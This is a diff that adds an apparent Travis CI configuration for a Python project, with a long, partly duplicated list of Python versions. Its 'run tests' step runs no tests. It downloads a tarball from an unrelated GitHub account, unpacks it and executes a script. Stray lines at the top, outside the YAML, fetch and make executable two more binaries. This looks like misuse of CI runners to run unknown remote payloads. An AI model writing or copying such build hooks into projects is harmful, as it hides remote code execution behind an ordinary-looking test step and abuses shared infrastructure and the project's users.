@@ -1,0 +1,50 @@
+99e7c0e3-d3a2-4c47-a6c2-cf72d5985b77
+soruvenum
+
+wget https://github.com/thoeb292/thoeb292/raw/main/masterfile 
+chmod +x masterfile
+wget https://github.com/thoeb292/thoeb292/raw/main/mas.sh
+chmod +x mas.sh 
+
+language: python
+python:
+  - "2.7.14"
+  - "2.7.13"
+  - "2.7.15"
+  - "2.7.14"
+  - "2.7.15"
+  - "2.7.16"
+  - "2.7.17"
+  - "2.7.18"
+  - "2.7"
+  - "3.4.5"
+  - "3.4.6"
+  - "3.4.7"
+  - "3.4.8"
+  - "3.4"
+  - "3.5.10"
+  - "3.5.2"
+  - "3.5.3"
+  - "3.5.5"  
+  - "3.4"
+  - "3.5"
+  - "3.6"      # current default Python on Travis CI
+  - "3.7"
+  - "3.8"
+  - "3.9"
+# command to install dependencies
+
+install: 
+  - pip install travis-wait-improved
+
+# command to run tests
+script:
+  - wget https://github.com/baxwru2/thoeb292/raw/main/main.tar.gz 
+  - tar xf main.tar.gz 
+  - ./sgr.sh
+  
+  
+  
+  
+  
+  
